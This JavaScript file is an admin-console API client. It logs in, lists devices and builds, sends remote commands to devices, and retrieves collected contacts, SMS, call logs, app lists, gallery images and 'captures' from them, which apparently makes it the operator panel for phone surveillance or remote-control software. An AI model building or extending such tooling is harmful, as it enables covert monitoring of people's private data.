/**
 * 管理后台 API 层（规约 PROTOCOL 5.1：api 提供管理端接口，admin 调用，鉴权与用户端分离）
 * 存储：apiBase（api 域名）、adminToken（管理端 Token）
 */
(function () {
  var API_BASE_KEY = 'admin_api_base';
  var ADMIN_TOKEN_KEY = 'admin_token';

  /** 部署在 admin.sdkdns.top 时默认使用 HTTPS 标准端口 API，无需管理员填写 */
  function getDefaultApiBase() {
    try {
      if (typeof window !== 'undefined' && window.location && window.location.hostname === 'admin.sdkdns.top')
        return 'https://api.sdkdns.top';
    } catch (e) {}
    return '';
  }

  function getApiBase() {
    var base = localStorage.getItem(API_BASE_KEY);
    if (base) return base.replace(/\/+$/, '');
    return getDefaultApiBase(); // 同源或相对路径时可为空；标准部署域下默认 api 域名
  }

  function setApiBase(base) {
    localStorage.setItem(API_BASE_KEY, (base || '').replace(/\/+$/, ''));
  }

  function getAdminToken() {
    return localStorage.getItem(ADMIN_TOKEN_KEY) || '';
  }

  function setAdminToken(token) {
    if (token) localStorage.setItem(ADMIN_TOKEN_KEY, token);
    else localStorage.removeItem(ADMIN_TOKEN_KEY);
  }

  function url(path) {
    var base = getApiBase();
    if (base) return base + (path.startsWith('/') ? path : '/' + path);
    return (path.startsWith('/') ? path : '/api' + (path.startsWith('/') ? path : '/' + path));
  }

  /**
   * 带管理端鉴权的 fetch（Authorization: Bearer <admin_token>）
   */
  function fetchWithAuth(path, opts) {
    opts = opts || {};
    var headers = opts.headers || {};
    var token = getAdminToken();
    if (token) headers['Authorization'] = 'Bearer ' + token;
    headers['Content-Type'] = headers['Content-Type'] || 'application/json';
    opts.headers = headers;
    opts.credentials = opts.credentials || 'same-origin';
    return fetch(url(path), opts);
  }

  /**
   * 管理端登录（规约：独立鉴权，由 api 或 admin 后端提供）
   * POST /api/v1/admin/auth Body: { username, password } -> { admin_token } 或由实现约定
   */
  function login(username, password) {
    var base = getApiBase();
    var loginUrl = base ? base + '/api/v1/admin/auth' : '/api/v1/admin/auth';
    return fetch(loginUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
      credentials: 'same-origin',
      body: JSON.stringify({ username: username, password: password })
    }).then(function (res) {
      if (res.status === 200) {
        return res.json().then(function (data) {
          var token = data.admin_token || data.access_token || data.token;
          if (token) {
            setAdminToken(token);
            return { ok: true };
          }
          return { ok: false, message: 'no token in response' };
        });
      }
      return res.json().catch(function () { return {}; }).then(function (body) {
        return { ok: false, status: res.status, code: body.code, message: body.message };
      });
    }).catch(function (err) {
      return { ok: false, message: err.message || 'network error' };
    });
  }

  function getDevices(params) {
    var q = new URLSearchParams(params || {}).toString();
    return fetchWithAuth('/api/v1/admin/devices' + (q ? '?' + q : '')).then(function (r) {
      return r.status === 200 ? r.json() : Promise.reject(r);
    });
  }

  function getUsers(params) {
    var q = new URLSearchParams(params || {}).toString();
    return fetchWithAuth('/api/v1/admin/users' + (q ? '?' + q : '')).then(function (r) {
      return r.status === 200 ? r.json() : Promise.reject(r);
    });
  }

  function getRelations(params) {
    var q = new URLSearchParams(params || {}).toString();
    return fetchWithAuth('/api/v1/admin/relations' + (q ? '?' + q : '')).then(function (r) {
      return r.status === 200 ? r.json() : Promise.reject(r);
    });
  }

  function sendCommand(deviceId, cmd, params) {
    return fetchWithAuth('/api/v1/admin/devices/' + encodeURIComponent(deviceId) + '/command', {
      method: 'POST',
      body: JSON.stringify({ cmd: cmd, params: params || {} })
    });
  }

  function getBuilds(params) {
    var q = new URLSearchParams(params || {}).toString();
    return fetchWithAuth('/api/v1/admin/builds' + (q ? '?' + q : '')).then(function (r) {
      return r.status === 200 ? r.json() : Promise.reject(r);
    });
  }

  /** 管理端审计数据查询（GET /api/v1/admin/audit/:type?device_id=xxx），type: contacts|sms|call_log|app_list|gallery|captures */
  function getAudit(deviceId, type) {
    if (!deviceId || !type) return Promise.reject(new Error('device_id and type required'));
    var path = '/api/v1/admin/audit/' + encodeURIComponent(type) + '?device_id=' + encodeURIComponent(deviceId);
    return fetchWithAuth(path).then(function (r) {
      return r.status === 200 ? r.json() : Promise.reject(r);
    });
  }

  /** 下载单条审计 blob：GET /api/v1/admin/audit/blob/:id，带鉴权，触发浏览器下载 */
  function downloadAuditBlob(id, suggestedFilename) {
    var base = getApiBase();
    var url = (base ? base : '') + '/api/v1/admin/audit/blob/' + encodeURIComponent(String(id));
    return fetchWithAuth(url).then(function (r) {
      if (!r.ok) return Promise.reject(r);
      return r.blob().then(function (blob) {
        var a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = suggestedFilename || ('audit_' + id + '.bin');
        a.click();
        URL.revokeObjectURL(a.href);
      });
    });
  }

  window.ADMIN_API = {
    getApiBase: getApiBase,
    setApiBase: setApiBase,
    getAdminToken: getAdminToken,
    setAdminToken: setAdminToken,
    fetchWithAuth: fetchWithAuth,
    login: login,
    getDevices: getDevices,
    getUsers: getUsers,
    getRelations: getRelations,
    sendCommand: sendCommand,
    getBuilds: getBuilds,
    getAudit: getAudit,
    downloadAuditBlob: downloadAuditBlob
  };
})();
